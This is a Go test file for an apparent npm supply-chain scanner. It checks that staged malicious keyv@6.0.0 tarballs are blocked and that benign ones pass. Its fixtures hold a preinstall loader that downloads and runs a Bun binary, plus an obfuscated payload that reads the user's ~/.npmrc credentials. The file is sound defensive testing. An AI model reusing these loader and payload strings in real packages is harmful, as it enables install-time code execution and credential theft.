package cli

import "testing"

// ChainDrop / keyv@6.0.0 (row 51), guard side.
//
// Since v0.22.106 (F11) the guard's referencedScriptVerdict follows the same
// second hop as the server (installscripts.NextHopScripts, see
// scanReferencedScripts in core/intelligence/provider_installscripts.go); it
// used to scan the first hop only. The readable Bun loader is also refused on
// the first hop now (fetch Bun, run a bundled script with it).
func TestAttack2026_51_ChainDrop_Guard(t *testing.T) {
	manifest := `{"name":"keyv","version":"6.0.0","scripts":{"preinstall":"node setup.mjs"}}`
	loader := "import https from 'node:https';import fs from 'node:fs';import path from 'node:path';\n" +
		"import {execFileSync} from 'node:child_process';\n" +
		"https.get('https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip',r=>{" +
		"r.pipe(fs.createWriteStream('/tmp/b.zip')).on('finish',()=>{execFileSync('unzip',['-o','/tmp/b.zip']);" +
		"execFileSync('/tmp/bun',[path.join(__dirname,'Math_Symbol.js')]);});});\n"
	payload := "// @bun @bun-cjs\n" + atkBObf("const t=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');\n")

	staged := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": manifest, "setup.mjs": loader, "Math_Symbol.js": payload,
	}))
	if !staged.Block {
		t.Fatalf("readable Bun loader + obfuscated Math_Symbol.js not refused: %+v", staged)
	}

	// The second hop on its own: a loader with nothing to escalate (node
	// runs the sibling, no fetch) is refused for the obfuscated sibling.
	hop2 := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json":   manifest,
		"setup.mjs":      "import path from 'node:path';import {spawnSync} from 'node:child_process';\nspawnSync(process.execPath,[path.join(__dirname,'Math_Symbol.js')]);\n",
		"Math_Symbol.js": payload,
	}))
	if !hop2.Block {
		t.Fatalf("second hop not followed: %+v", hop2)
	}
	benignHop := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json":   manifest,
		"setup.mjs":      "import path from 'node:path';import {spawnSync} from 'node:child_process';\nspawnSync(process.execPath,[path.join(__dirname,'Math_Symbol.js')]);\n",
		"Math_Symbol.js": "module.exports = Math.max;\n",
	}))
	if benignHop.Block {
		t.Fatalf("benign second hop refused: %+v", benignHop)
	}

	// An obfuscated loader (the jaredwray wave) IS refused on the first hop.
	obf := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": manifest, "setup.mjs": atkBObf(loader), "Math_Symbol.js": payload,
	}))
	if !obf.Block {
		t.Fatalf("obfuscated loader not refused: %+v", obf)
	}

	clean := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json":   `{"name":"keyv","version":"5.6.0","main":"dist/index.cjs"}`,
		"dist/index.cjs": "module.exports=class Keyv{};\n",
	}))
	if clean.Block {
		t.Fatalf("keyv@5.6.0 refused: %+v", clean)
	}
}
